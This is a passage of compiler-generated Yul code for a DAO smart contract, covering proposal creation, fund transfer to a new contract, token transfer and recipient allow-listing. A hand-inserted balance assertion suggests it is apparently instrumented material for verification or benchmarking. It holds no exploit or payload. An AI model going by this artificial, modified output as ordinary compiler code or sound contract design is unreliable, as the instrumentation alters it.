                            /// @src 0:31764:31773  "!isFueled"
                            let expr_1296 := cleanup_t_bool(iszero(expr_1295))
                            /// @src 0:31764:31818  "!isFueled..."
                            let expr_1301 := expr_1296
                            if iszero(expr_1301) {
                                /// @src 0:31789:31804  "block.timestamp"
                                let expr_1298 := timestamp()
                                /// @src 0:31807:31818  "closingTime"
                                let _265 := read_from_storage_split_offset_0_t_uint256(0x00)
                                let expr_1299 := _265
                                /// @src 0:31789:31818  "block.timestamp < closingTime"
                                let expr_1300 := lt(cleanup_t_uint256(expr_1298), cleanup_t_uint256(expr_1299))
                                /// @src 0:31764:31818  "!isFueled..."
                                expr_1301 := expr_1300
                            }
                            /// @src 0:31764:31879  "!isFueled..."
                            let expr_1310 := expr_1301
                            if iszero(expr_1310) {
                                /// @src 0:31835:31844  "msg.value"
                                let expr_1303 := callvalue()
                                /// @src 0:31847:31862  "proposalDeposit"
                                let _266 := read_from_storage_split_offset_0_t_uint256(0x14)
                                let expr_1304 := _266
                                /// @src 0:31835:31862  "msg.value < proposalDeposit"
                                let expr_1305 := lt(cleanup_t_uint256(expr_1303), cleanup_t_uint256(expr_1304))
                                /// @src 0:31835:31878  "msg.value < proposalDeposit && !_newCurator"
                                let expr_1308 := expr_1305
                                if expr_1308 {
                                    /// @src 0:31867:31878  "_newCurator"
                                    let _267 := var__newCurator_1231
                                    let expr_1306 := _267
                                    /// @src 0:31866:31878  "!_newCurator"
                                    let expr_1307 := cleanup_t_bool(iszero(expr_1306))
                                    /// @src 0:31835:31878  "msg.value < proposalDeposit && !_newCurator"
                                    expr_1308 := expr_1307
                                }
                                /// @src 0:31834:31879  "(msg.value < proposalDeposit && !_newCurator)"
                                let expr_1309 := expr_1308
                                /// @src 0:31764:31879  "!isFueled..."
                                expr_1310 := expr_1309
                            }
                            /// @src 0:31763:31880  "(!isFueled..."
                            let expr_1311 := expr_1310
                            /// @src 0:31762:31880  "!(!isFueled..."
                            let expr_1312 := cleanup_t_bool(iszero(expr_1311))
                            /// @src 0:31755:31881  "assert(!(!isFueled..."
                            assert_helper(expr_1312)
                            /// @src 0:31901:31916  "block.timestamp"
                            let expr_1317 := timestamp()
                            /// @src 0:31919:31934  "_debatingPeriod"
                            let _268 := var__debatingPeriod_1229
                            let expr_1318 := _268
                            /// @src 0:31901:31934  "block.timestamp + _debatingPeriod"
                            let expr_1319 := checked_add_t_uint256(expr_1317, expr_1318)

                            /// @src 0:31937:31952  "block.timestamp"
                            let expr_1321 := timestamp()
                            /// @src 0:31901:31952  "block.timestamp + _debatingPeriod < block.timestamp"
                            let expr_1322 := lt(cleanup_t_uint256(expr_1319), cleanup_t_uint256(expr_1321))
                            /// @src 0:31900:31953  "(block.timestamp + _debatingPeriod < block.timestamp)"
                            let expr_1323 := expr_1322
                            /// @src 0:31899:31953  "!(block.timestamp + _debatingPeriod < block.timestamp)"
                            let expr_1324 := cleanup_t_bool(iszero(expr_1323))
                            /// @src 0:31892:31954  "assert(!(block.timestamp + _debatingPeriod < block.timestamp))"
                            assert_helper(expr_1324)
                            /// @src 0:32080:32090  "msg.sender"
                            let expr_1329 := caller()
                            /// @src 0:32102:32106  "this"
                            let expr_1332_address := address()
                            /// @src 0:32094:32107  "address(this)"
                            let expr_1333 := convert_t_contract$_DAO_$3021_to_t_address(expr_1332_address)
                            /// @src 0:32080:32107  "msg.sender == address(this)"
                            let expr_1334 := eq(cleanup_t_address(expr_1329), cleanup_t_address(expr_1333))
                            /// @src 0:32079:32108  "(msg.sender == address(this))"
                            let expr_1335 := expr_1334
                            /// @src 0:32078:32108  "!(msg.sender == address(this))"
                            let expr_1336 := cleanup_t_bool(iszero(expr_1335))
                            /// @src 0:32070:32109  "assert (!(msg.sender == address(this)))"
                            assert_helper(expr_1336)
                            /// @src 0:32134:32143  "proposals"
                            let _269_slot := 0x08
                            let expr_1340_slot := _269_slot
                            /// @src 0:32134:32150  "proposals.length"
                            let expr_1341 := array_length_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage(expr_1340_slot)
                            /// @src 0:32120:32150  "_proposalID = proposals.length"
                            var__proposalID_1237 := expr_1341
                            let expr_1342 := expr_1341
                            /// @src 0:32160:32169  "proposals"
                            let _270_slot := 0x08
                            let expr_1344_slot := _270_slot
                            /// @src 0:32160:32174  "proposals.push"
                            let expr_1346_self_slot := convert_array_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage_to_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage_ptr(expr_1344_slot)
                            /// @src 0:32160:32176  "proposals.push()"
                            let _271, _272 := array_push_zero_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage_ptr(expr_1346_self_slot)
                            let _273_slot := _271
                            let expr_1347_slot := _273_slot
                            /// @src 0:32207:32216  "proposals"
                            let _274_slot := 0x08
                            let expr_1352_slot := _274_slot
                            /// @src 0:32217:32228  "_proposalID"
                            let _275 := var__proposalID_1237
                            let expr_1353 := _275
                            /// @src 0:32207:32229  "proposals[_proposalID]"

                            let _276, _277 := storage_array_index_access_t_array$_t_struct$_Proposal_$800_storage_$dyn_storage(expr_1352_slot, expr_1353)
                            let _278_slot := _276
                            let expr_1354_slot := _278_slot
                            /// @src 0:32186:32229  "Proposal storage p = proposals[_proposalID]"
                            let var_p_1351_slot := convert_t_struct$_Proposal_$800_storage_to_t_struct$_Proposal_$800_storage_ptr(expr_1354_slot)
                            /// @src 0:32253:32263  "_recipient"
                            let _279 := var__recipient_1221
                            let expr_1359 := _279
                            /// @src 0:32239:32240  "p"
                            let _280_slot := var_p_1351_slot
                            let expr_1356_slot := _280_slot
                            /// @src 0:32239:32250  "p.recipient"
                            let _281 := add(expr_1356_slot, 0)
                            /// @src 0:32239:32263  "p.recipient = _recipient"
                            update_storage_value_offset_0_t_address_to_t_address(_281, expr_1359)
                            let expr_1360 := expr_1359
                            /// @src 0:32284:32291  "_amount"
                            let _282 := var__amount_1223
                            let expr_1365 := _282
                            /// @src 0:32273:32274  "p"
                            let _283_slot := var_p_1351_slot
                            let expr_1362_slot := _283_slot
                            /// @src 0:32273:32281  "p.amount"
                            let _284 := add(expr_1362_slot, 1)
                            /// @src 0:32273:32291  "p.amount = _amount"
                            update_storage_value_offset_0_t_uint256_to_t_uint256(_284, expr_1365)
                            let expr_1366 := expr_1365
                            /// @src 0:32317:32329  "_description"
                            let _285_mpos := var__description_1225_mpos
                            let expr_1371_mpos := _285_mpos
                            /// @src 0:32301:32302  "p"
                            let _286_slot := var_p_1351_slot
                            let expr_1368_slot := _286_slot
                            /// @src 0:32301:32314  "p.description"
                            let _287 := add(expr_1368_slot, 2)
                            /// @src 0:32301:32329  "p.description = _description"
                            update_storage_value_offset_0_t_string_memory_ptr_to_t_string_storage(_287, expr_1371_mpos)
                            let _288_slot := _287
                            let expr_1372_slot := _288_slot
                            /// @src 0:32383:32384  "p"
                            let _289_slot := var_p_1351_slot
                            let expr_1380_slot := _289_slot
                            /// @src 0:32383:32394  "p.recipient"
                            let _290 := add(expr_1380_slot, 0)
                            let _291 := read_from_storage_split_offset_0_t_address(_290)
                            let expr_1381 := _291
                            /// @src 0:32396:32397  "p"
                            let _292_slot := var_p_1351_slot
                            let expr_1382_slot := _292_slot
                            /// @src 0:32396:32404  "p.amount"
                            let _293 := add(expr_1382_slot, 1)
                            let _294 := read_from_storage_split_offset_0_t_uint256(_293)
                            let expr_1383 := _294
                            /// @src 0:32406:32422  "_transactionData"
                            let _295_mpos := var__transactionData_1227_mpos
                            let expr_1384_mpos := _295_mpos
                            /// @src 0:32366:32423  "abi.encodePacked(p.recipient, p.amount, _transactionData)"

                            let expr_1385_mpos := allocate_unbounded()
                            let _296 := add(expr_1385_mpos, 0x20)

                            let _297 := abi_encode_tuple_packed_t_address_t_uint256_t_bytes_memory_ptr__to_t_address_t_uint256_t_bytes_memory_ptr__nonPadded_inplace_fromStack(_296, expr_1381, expr_1383, expr_1384_mpos)
                            mstore(expr_1385_mpos, sub(_297, add(expr_1385_mpos, 0x20)))
                            finalize_allocation(expr_1385_mpos, sub(_297, expr_1385_mpos))
                            /// @src 0:32356:32424  "keccak256(abi.encodePacked(p.recipient, p.amount, _transactionData))"
                            let expr_1386 := keccak256(array_dataslot_t_bytes_memory_ptr(expr_1385_mpos), array_length_t_bytes_memory_ptr(expr_1385_mpos))
                            /// @src 0:32339:32340  "p"
                            let _298_slot := var_p_1351_slot
                            let expr_1374_slot := _298_slot
                            /// @src 0:32339:32353  "p.proposalHash"
                            let _299 := add(expr_1374_slot, 5)
                            /// @src 0:32339:32424  "p.proposalHash = keccak256(abi.encodePacked(p.recipient, p.amount, _transactionData))"
                            update_storage_value_offset_0_t_bytes32_to_t_bytes32(_299, expr_1386)
                            let expr_1387 := expr_1386
                            /// @src 0:32453:32468  "block.timestamp"
                            let expr_1393 := timestamp()
                            /// @src 0:32471:32486  "_debatingPeriod"
                            let _300 := var__debatingPeriod_1229
                            let expr_1394 := _300
                            /// @src 0:32453:32486  "block.timestamp + _debatingPeriod"
                            let expr_1395 := checked_add_t_uint256(expr_1393, expr_1394)

                            /// @src 0:32434:32435  "p"
                            let _301_slot := var_p_1351_slot
                            let expr_1389_slot := _301_slot
                            /// @src 0:32434:32450  "p.votingDeadline"
                            let _302 := add(expr_1389_slot, 3)
                            /// @src 0:32434:32486  "p.votingDeadline = block.timestamp + _debatingPeriod"
                            update_storage_value_offset_0_t_uint256_to_t_uint256(_302, expr_1395)
                            let expr_1396 := expr_1395
                            /// @src 0:32505:32509  "true"
                            let expr_1401 := 0x01
                            /// @src 0:32496:32497  "p"
                            let _303_slot := var_p_1351_slot
                            let expr_1398_slot := _303_slot
                            /// @src 0:32496:32502  "p.open"
                            let _304 := add(expr_1398_slot, 4)
                            /// @src 0:32496:32509  "p.open = true"
                            update_storage_value_offset_0_t_bool_to_t_bool(_304, expr_1401)
                            let expr_1402 := expr_1401
                            /// @src 0:32588:32599  "_newCurator"
                            let _305 := var__newCurator_1231
                            let expr_1407 := _305
                            /// @src 0:32573:32574  "p"
                            let _306_slot := var_p_1351_slot
                            let expr_1404_slot := _306_slot
                            /// @src 0:32573:32585  "p.newCurator"
                            let _307 := add(expr_1404_slot, 7)
                            /// @src 0:32573:32599  "p.newCurator = _newCurator"
                            update_storage_value_offset_0_t_bool_to_t_bool(_307, expr_1407)
                            let expr_1408 := expr_1407
                            /// @src 0:32613:32624  "_newCurator"
                            let _308 := var__newCurator_1231
                            let expr_1410 := _308
                            /// @src 0:32609:32656  "if (_newCurator)..."
                            if expr_1410 {
                                /// @src 0:32638:32639  "p"
                                let _309_slot := var_p_1351_slot
                                let expr_1411_slot := _309_slot
                                /// @src 0:32638:32649  "p.splitData"
                                let _310 := add(expr_1411_slot, 8)
                                let _311_slot := _310
                                let expr_1414_slot := _311_slot
                                /// @src 0:32638:32654  "p.splitData.push"
                                let expr_1415_self_slot := convert_array_t_array$_t_struct$_SplitData_$810_storage_$dyn_storage_to_t_array$_t_struct$_SplitData_$810_storage_$dyn_storage_ptr(expr_1414_slot)
                                /// @src 0:32638:32656  "p.splitData.push()"
                                let _312, _313 := array_push_zero_t_array$_t_struct$_SplitData_$810_storage_$dyn_storage_ptr(expr_1415_self_slot)
                                let _314_slot := _312
                                let expr_1416_slot := _314_slot
                                /// @src 0:32609:32656  "if (_newCurator)..."
                            }
                            /// @src 0:32686:32696  "msg.sender"
                            let expr_1425 := caller()
                            /// @src 0:32678:32697  "payable(msg.sender)"
                            let expr_1426 := convert_t_address_to_t_address_payable(expr_1425)
                            /// @src 0:32666:32667  "p"
                            let _315_slot := var_p_1351_slot
                            let expr_1419_slot := _315_slot
                            /// @src 0:32666:32675  "p.creator"
                            let _316 := add(expr_1419_slot, 13)
                            /// @src 0:32666:32697  "p.creator = payable(msg.sender)"
                            update_storage_value_offset_0_t_address_payable_to_t_address_payable(_316, expr_1426)
                            let expr_1427 := expr_1426
                            /// @src 0:32727:32736  "msg.value"
                            let expr_1433 := callvalue()
                            /// @src 0:32707:32708  "p"
                            let _317_slot := var_p_1351_slot
                            let expr_1429_slot := _317_slot
                            /// @src 0:32707:32724  "p.proposalDeposit"
                            let _318 := add(expr_1429_slot, 6)
                            /// @src 0:32707:32736  "p.proposalDeposit = msg.value"
                            update_storage_value_offset_0_t_uint256_to_t_uint256(_318, expr_1433)
                            let expr_1434 := expr_1433
                            /// @src 0:32772:32781  "msg.value"
                            let expr_1438 := callvalue()
                            /// @src 0:32747:32781  "sumOfProposalDeposits += msg.value"
                            let _319 := read_from_storage_split_offset_0_t_uint256(0x15)
                            let expr_1439 := checked_add_t_uint256(_319, expr_1438)

                            update_storage_value_offset_0_t_uint256_to_t_uint256(0x15, expr_1439)
                            /// @src 0:32824:32835  "_proposalID"
                            let _320 := var__proposalID_1237
                            let expr_1442 := _320
                            /// @src 0:32849:32859  "_recipient"
                            let _321 := var__recipient_1221
                            let expr_1443 := _321
                            /// @src 0:32873:32880  "_amount"
                            let _322 := var__amount_1223
                            let expr_1444 := _322
                            /// @src 0:32894:32905  "_newCurator"
                            let _323 := var__newCurator_1231
                            let expr_1445 := _323
                            /// @src 0:32919:32931  "_description"
                            let _324_mpos := var__description_1225_mpos
                            let expr_1446_mpos := _324_mpos
                            /// @src 0:32797:32941  "ProposalAdded(..."
                            let _325 := 0x5790de2c279e58269b93b12828f56fd5f2bc8ad15e61ce08572585c81a38756f
                            let _326 := convert_t_uint256_to_t_uint256(expr_1442)
                            {
                                let _327 := allocate_unbounded()
                                let _328 := abi_encode_tuple_t_address_t_uint256_t_bool_t_string_memory_ptr__to_t_address_t_uint256_t_bool_t_string_memory_ptr__fromStack(_327 , expr_1443, expr_1444, expr_1445, expr_1446_mpos)
                                log2(_327, sub(_328, _327) , _325, _326)
                            }
                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        /// @ast-id 1450
                        /// @src 0:30999:32948  "function newProposal(..."
                        function fun_newProposal_1450(var__recipient_1221, var__amount_1223, var__description_1225_mpos, var__transactionData_1227_mpos, var__debatingPeriod_1229, var__newCurator_1231) -> var__proposalID_1237 {
                            /// @src 0:31257:31273  "uint _proposalID"
                            let zero_t_uint256_249 := zero_value_for_split_t_uint256()
                            var__proposalID_1237 := zero_t_uint256_249

                            var__proposalID_1237 := modifier_onlyTokenholders_1234(var__proposalID_1237, var__recipient_1221, var__amount_1223, var__description_1225_mpos, var__transactionData_1227_mpos, var__debatingPeriod_1229, var__newCurator_1231)
                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        /// @ast-id 2367
                        /// @src 0:40472:40994  "function newContract(address _newContract) public override{..."
                        function fun_newContract_2367(var__newContract_2291) {

                            /// @src 0:40544:40554  "msg.sender"
                            let expr_2296 := caller()
                            /// @src 0:40566:40570  "this"
                            let expr_2299_address := address()
                            /// @src 0:40558:40571  "address(this)"
                            let expr_2300 := convert_t_contract$_DAO_$3021_to_t_address(expr_2299_address)
                            /// @src 0:40544:40571  "msg.sender != address(this)"
                            let expr_2301 := iszero(eq(cleanup_t_address(expr_2296), cleanup_t_address(expr_2300)))
                            /// @src 0:40544:40607  "msg.sender != address(this) || !allowedRecipients[_newContract]"
                            let expr_2306 := expr_2301
                            if iszero(expr_2306) {
                                /// @src 0:40576:40593  "allowedRecipients"
                                let _329_slot := 0x0c
                                let expr_2302_slot := _329_slot
                                /// @src 0:40594:40606  "_newContract"
                                let _330 := var__newContract_2291
                                let expr_2303 := _330
                                /// @src 0:40576:40607  "allowedRecipients[_newContract]"
                                let _331 := mapping_index_access_t_mapping$_t_address_$_t_bool_$_of_t_address(expr_2302_slot,expr_2303)
                                let _332 := read_from_storage_split_offset_0_t_bool(_331)
                                let expr_2304 := _332
                                /// @src 0:40575:40607  "!allowedRecipients[_newContract]"
                                let expr_2305 := cleanup_t_bool(iszero(expr_2304))
                                /// @src 0:40544:40607  "msg.sender != address(this) || !allowedRecipients[_newContract]"
                                expr_2306 := expr_2305
                            }
                            /// @src 0:40540:40616  "if (msg.sender != address(this) || !allowedRecipients[_newContract]) return;"
                            if expr_2306 {
                                /// @src 0:40609:40616  "return;"
                                leave
                                /// @src 0:40540:40616  "if (msg.sender != address(this) || !allowedRecipients[_newContract]) return;"
                            }
                            /// @src 0:40670:40682  "_newContract"
                            let _333 := var__newContract_2291
                            let expr_2311 := _333
                            /// @src 0:40670:40687  "_newContract.call"
                            let expr_2312_address := expr_2311
                            /// @src 0:40703:40707  "this"
                            let expr_2315_address := address()
                            /// @src 0:40695:40708  "address(this)"
                            let expr_2316 := convert_t_contract$_DAO_$3021_to_t_address(expr_2315_address)
                            /// @src 0:40695:40716  "address(this).balance"
                            let expr_2317 := balance(expr_2316)
                            /// @src 0:40670:40717  "_newContract.call{value: address(this).balance}"
                            let expr_2318_address := expr_2312_address
                            let expr_2318_value := expr_2317
                            /// @src 0:40670:40721  "_newContract.call{value: address(this).balance}(\"\")"

                            let _334 := allocate_unbounded()
                            let _335 := sub(abi_encode_tuple_packed_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack(_334  ), _334)

                            let pbal := balance(address())

                            let expr_2320_component_1 := call(gas(), expr_2318_address,  expr_2318_value,  _334, _335, 0, 0)
                            if lt(balance(address()),pbal) {
                                ASSERT(eq(sub(pbal,expr_2318_value) , balance(address())))
                            }
                            
                            let expr_2320_component_2_mpos := extract_returndata()
                            /// @src 0:40651:40721  "(bool success, ) = _newContract.call{value: address(this).balance}(\"\")"
                            let var_success_2310 := expr_2320_component_1
                            /// @src 0:40738:40745  "success"
                            let _336 := var_success_2310
                            let expr_2323 := _336
                            /// @src 0:40731:40746  "assert(success)"
                            assert_helper(expr_2323)
                            /// @src 0:40819:40830  "rewardToken"
                            let _337_slot := 0x0d
                            let expr_2329_slot := _337_slot
                            /// @src 0:40839:40843  "this"
                            let expr_2332_address := address()
                            /// @src 0:40831:40844  "address(this)"
                            let expr_2333 := convert_t_contract$_DAO_$3021_to_t_address(expr_2332_address)
                            /// @src 0:40819:40845  "rewardToken[address(this)]"
                            let _338 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_2329_slot,expr_2333)
                            let _339 := read_from_storage_split_offset_0_t_uint256(_338)
                            let expr_2334 := _339
                            /// @src 0:40790:40801  "rewardToken"
                            let _340_slot := 0x0d
                            let expr_2326_slot := _340_slot
                            /// @src 0:40802:40814  "_newContract"
                            let _341 := var__newContract_2291
                            let expr_2327 := _341
                            /// @src 0:40790:40815  "rewardToken[_newContract]"
                            let _342 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_2326_slot,expr_2327)
                            /// @src 0:40790:40845  "rewardToken[_newContract] += rewardToken[address(this)]"
                            let _343 := read_from_storage_split_offset_0_t_uint256(_342)
                            let expr_2335 := checked_add_t_uint256(_343, expr_2334)

                            update_storage_value_offset_0_t_uint256_to_t_uint256(_342, expr_2335)
                            /// @src 0:40884:40885  "0"
                            let expr_2343 := 0x00
                            /// @src 0:40855:40885  "rewardToken[address(this)] = 0"
                            let _344 := convert_t_rational_0_by_1_to_t_uint256(expr_2343)
                            /// @src 0:40855:40866  "rewardToken"
                            let _345_slot := 0x0d
                            let expr_2337_slot := _345_slot
                            /// @src 0:40875:40879  "this"
                            let expr_2340_address := address()
                            /// @src 0:40867:40880  "address(this)"
                            let expr_2341 := convert_t_contract$_DAO_$3021_to_t_address(expr_2340_address)
                            /// @src 0:40855:40881  "rewardToken[address(this)]"
                            let _346 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_2337_slot,expr_2341)
                            /// @src 0:40855:40885  "rewardToken[address(this)] = 0"
                            update_storage_value_offset_0_t_uint256_to_t_uint256(_346, _344)
                            let expr_2344 := _344
                            /// @src 0:40923:40933  "DAOpaidOut"
                            let _347_slot := 0x11
                            let expr_2349_slot := _347_slot
                            /// @src 0:40942:40946  "this"
                            let expr_2352_address := address()
                            /// @src 0:40934:40947  "address(this)"
                            let expr_2353 := convert_t_contract$_DAO_$3021_to_t_address(expr_2352_address)
                            /// @src 0:40923:40948  "DAOpaidOut[address(this)]"
                            let _348 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_2349_slot,expr_2353)
                            let _349 := read_from_storage_split_offset_0_t_uint256(_348)
                            let expr_2354 := _349
                            /// @src 0:40895:40905  "DAOpaidOut"
                            let _350_slot := 0x11
                            let expr_2346_slot := _350_slot
                            /// @src 0:40906:40918  "_newContract"
                            let _351 := var__newContract_2291
                            let expr_2347 := _351
                            /// @src 0:40895:40919  "DAOpaidOut[_newContract]"
                            let _352 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_2346_slot,expr_2347)
                            /// @src 0:40895:40948  "DAOpaidOut[_newContract] += DAOpaidOut[address(this)]"
                            let _353 := read_from_storage_split_offset_0_t_uint256(_352)
                            let expr_2355 := checked_add_t_uint256(_353, expr_2354)

                            update_storage_value_offset_0_t_uint256_to_t_uint256(_352, expr_2355)
                            /// @src 0:40986:40987  "0"
                            let expr_2363 := 0x00
                            /// @src 0:40958:40987  "DAOpaidOut[address(this)] = 0"
                            let _354 := convert_t_rational_0_by_1_to_t_uint256(expr_2363)
                            /// @src 0:40958:40968  "DAOpaidOut"
                            let _355_slot := 0x11
                            let expr_2357_slot := _355_slot
                            /// @src 0:40977:40981  "this"
                            let expr_2360_address := address()
                            /// @src 0:40969:40982  "address(this)"
                            let expr_2361 := convert_t_contract$_DAO_$3021_to_t_address(expr_2360_address)
                            /// @src 0:40958:40983  "DAOpaidOut[address(this)]"
                            let _356 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_2357_slot,expr_2361)
                            /// @src 0:40958:40987  "DAOpaidOut[address(this)] = 0"
                            update_storage_value_offset_0_t_uint256_to_t_uint256(_356, _354)
                            let expr_2364 := _354

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        /// @ast-id 109
                        /// @src 0:3853:3975  "function balanceOf(address _owner) public view override returns (uint256 balance) {..."
                        function fun_balanceOf_109(var__owner_98) -> var_balance_102 {
                            /// @src 0:3918:3933  "uint256 balance"
                            let zero_t_uint256_357 := zero_value_for_split_t_uint256()
                            var_balance_102 := zero_t_uint256_357

                            /// @src 0:3952:3960  "balances"
                            let _358_slot := 0x05
                            let expr_104_slot := _358_slot
                            /// @src 0:3961:3967  "_owner"
                            let _359 := var__owner_98
                            let expr_105 := _359
                            /// @src 0:3952:3968  "balances[_owner]"
                            let _360 := mapping_index_access_t_mapping$_t_address_$_t_uint256_$_of_t_address(expr_104_slot,expr_105)

                            let _361 := read_from_storage_split_offset_0_t_uint256(_360)
                            let expr_106 := _361
                            /// @src 0:3945:3968  "return balances[_owner]"
                            var_balance_102 := expr_106
                            leave

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        /// @ast-id 2789
                        /// @src 0:44178:44465  "function changeAllowedRecipients(address _recipient, bool _allowed) external override returns (bool _success) {..."
                        function fun_changeAllowedRecipients_2789(var__recipient_2760, var__allowed_2762) -> var__success_2766 {
                            /// @src 0:44273:44286  "bool _success"
                            let zero_t_bool_362 := zero_value_for_split_t_bool()
                            var__success_2766 := zero_t_bool_362

                            /// @src 0:44305:44315  "msg.sender"
                            let expr_2770 := caller()
                            /// @src 0:44319:44326  "curator"
                            let _363 := read_from_storage_split_offset_0_t_address(0x0b)
                            let expr_2771 := _363
                            /// @src 0:44305:44326  "msg.sender == curator"
                            let expr_2772 := eq(cleanup_t_address(expr_2770), cleanup_t_address(expr_2771))
                            /// @src 0:44298:44327  "assert(msg.sender == curator)"
                            assert_helper(expr_2772)
                            /// @src 0:44369:44377  "_allowed"
                            let _364 := var__allowed_2762
                            let expr_2778 := _364
                            /// @src 0:44337:44354  "allowedRecipients"
                            let _365_slot := 0x0c
                            let expr_2775_slot := _365_slot
                            /// @src 0:44355:44365  "_recipient"
                            let _366 := var__recipient_2760
                            let expr_2776 := _366
                            /// @src 0:44337:44366  "allowedRecipients[_recipient]"
                            let _367 := mapping_index_access_t_mapping$_t_address_$_t_bool_$_of_t_address(expr_2775_slot,expr_2776)
                            /// @src 0:44337:44377  "allowedRecipients[_recipient] = _allowed"
                            update_storage_value_offset_0_t_bool_to_t_bool(_367, expr_2778)
                            let expr_2779 := expr_2778
                            /// @src 0:44416:44426  "_recipient"
                            let _368 := var__recipient_2760
                            let expr_2782 := _368
                            /// @src 0:44428:44436  "_allowed"
                            let _369 := var__allowed_2762
                            let expr_2783 := _369
                            /// @src 0:44392:44437  "AllowedRecipientChanged(_recipient, _allowed)"
                            let _370 := 0x73ad2a153c8b67991df9459024950b318a609782cee8c7eeda47b905f9baa91f
                            let _371 := convert_t_address_to_t_address(expr_2782)
                            {
                                let _372 := allocate_unbounded()
                                let _373 := abi_encode_tuple_t_bool__to_t_bool__fromStack(_372 , expr_2783)
                                log2(_372, sub(_373, _372) , _370, _371)
                            }/// @src 0:44454:44458  "true"
                            let expr_2786 := 0x01
                            /// @src 0:44447:44458  "return true"
                            var__success_2766 := expr_2786
                            leave

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        /// @ast-id 2578
                        /// @src 0:42297:42669  "function transfer_2(address _to, uint256 _value) public returns (bool success) {..."
                        function fun_transfer_2_2578(var__to_2536, var__value_2538) -> var_success_2541 {
                            /// @src 0:42362:42374  "bool success"
                            let zero_t_bool_374 := zero_value_for_split_t_bool()
                            var_success_2541 := zero_t_bool_374

                            /// @src 0:42390:42398  "isFueled"
                            let _375 := read_from_storage_split_offset_0_t_bool(0x02)
                            let expr_2543 := _375
                            /// @src 0:42390:42443  "isFueled..."
                            let expr_2548 := expr_2543
                            if expr_2548 {
                                /// @src 0:42414:42429  "block.timestamp"
                                let expr_2545 := timestamp()
                                /// @src 0:42432:42443  "closingTime"
                                let _376 := read_from_storage_split_offset_0_t_uint256(0x00)
                                let expr_2546 := _376
                                /// @src 0:42414:42443  "block.timestamp > closingTime"
                                let expr_2547 := gt(cleanup_t_uint256(expr_2545), cleanup_t_uint256(expr_2546))
                                /// @src 0:42390:42443  "isFueled..."
                                expr_2548 := expr_2547
                            }
                            /// @src 0:42390:42481  "isFueled..."
                            let expr_2554 := expr_2548
                            if expr_2554 {
                                /// @src 0:42470:42480  "msg.sender"
                                let expr_2551 := caller()
                                /// @src 0:42460:42481  "isBlocked(msg.sender)"
                                let expr_2552 := fun_isBlocked_3008(expr_2551)
                                /// @src 0:42459:42481  "!isBlocked(msg.sender)"
                                let expr_2553 := cleanup_t_bool(iszero(expr_2552))
                                /// @src 0:42390:42481  "isFueled..."
                                expr_2554 := expr_2553
                            }
                            /// @src 0:42390:42537  "isFueled..."
                            let expr_2561 := expr_2554
                            if expr_2561 {
                                /// @src 0:42513:42523  "msg.sender"
                                let expr_2557 := caller()
                                /// @src 0:42525:42528  "_to"
                                let _377 := var__to_2536
                                let expr_2558 := _377
                                /// @src 0:42530:42536  "_value"
                                let _378 := var__value_2538
                                let expr_2559 := _378
                                /// @src 0:42497:42537  "transferPaidOut(msg.sender, _to, _value)"
                                let expr_2560 := fun_transferPaidOut_2720(expr_2557, expr_2558, expr_2559)
                                /// @src 0:42390:42537  "isFueled..."
                                expr_2561 := expr_2560
                            }
                            /// @src 0:42390:42580  "isFueled..."
                            let expr_2567 := expr_2561
                            if expr_2567 {
                                /// @src 0:42568:42571  "_to"
                                let _379 := var__to_2536
                                let expr_2564 := _379
                                /// @src 0:42573:42579  "_value"
                                let _380 := var__value_2538
                                let expr_2565 := _380
                                /// @src 0:42553:42580  "super.transfer(_to, _value)"
                                let expr_2566 := fun_transfer_157(expr_2564, expr_2565)
                                /// @src 0:42390:42580  "isFueled..."
                                expr_2567 := expr_2566
                            }
                            /// @src 0:42386:42663  "if (isFueled..."
                            switch expr_2567
                            case 0 {
                                /// @src 0:42646:42651  "false"
                                let expr_2572 := 0x00
                                /// @src 0:42639:42652  "assert(false)"
                                assert_helper(expr_2572)
                                /// @src 0:42386:42663  "if (isFueled..."
                            }
                            default {
                                /// @src 0:42604:42608  "true"
                                let expr_2568 := 0x01
                                /// @src 0:42597:42608  "return true"
                                var_success_2541 := expr_2568
                                leave
                                /// @src 0:42386:42663  "if (isFueled..."
                            }

                        }
                        /// @src 0:29431:47042  "contract DAO is DAOInterface, TokenCreation {..."

                        function cleanup_t_rational_15120000_by_1(value) -> cleaned {
                            cleaned := value
                        }

                        function convert_t_rational_15120000_by_1_to_t_uint256(value) -> converted {
                            converted := cleanup_t_uint256(identity(cleanup_t_rational_15120000_by_1(value)))
                        }

                        /// @src 0:14904:14948  "uint constant quorumHalvingPeriod = 25 weeks"
                        function constant_quorumHalvingPeriod_712() -> ret {
                            /// @src 0:14940:14948  "25 weeks"
                            let expr_711 := 0xe6b680
                            let _383 := convert_t_rational_15120000_by_1_to_t_uint256(expr_711)

                            ret := _383
                        }

                        function checked_mul_t_uint256(x, y) -> product {
                            x := cleanup_t_uint256(x)
                            y := cleanup_t_uint256(y)
                            let product_raw := mul(x, y)
                            product := cleanup_t_uint256(product_raw)

                            // overflow, if x != 0 and y != product/x
                            if iszero(
                                or(
                                    iszero(x),
                                    eq(y, div(product, x))
                                )
                            ) { panic_error_0x11() }

                        }

                        /// @ast-id 2908
                        /// @src 0:45356:45964  "function halveMinQuorum() public override returns (bool _success) {..."
                        function fun_halveMinQuorum_2908() -> var__success_2868 {
                            /// @src 0:45407:45420  "bool _success"
                            let zero_t_bool_381 := zero_value_for_split_t_bool()
                            var__success_2868 := zero_t_bool_381

